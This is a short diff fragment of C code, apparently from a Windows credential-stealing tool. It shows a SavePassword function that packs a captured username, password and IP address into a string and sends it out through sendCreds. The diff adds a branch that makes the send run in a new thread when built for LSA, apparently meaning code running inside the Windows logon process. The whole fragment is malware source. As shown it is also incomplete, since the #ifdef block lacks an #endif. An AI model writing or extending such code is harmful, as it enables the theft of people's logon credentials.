@@ -39,5 +39,8 @@ void SavePassword(PUNICODE_STRING username, PUNICODE_STRING password)
 	snprintf(creds, sizeof(creds), "%s\x11%s\x12%s\x13", user, pass, eip);
 	free(eip);
 
+#ifdef LSA
+	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&sendCreds, creds, 0, NULL);
+#else
 	sendCreds(creds);
 }
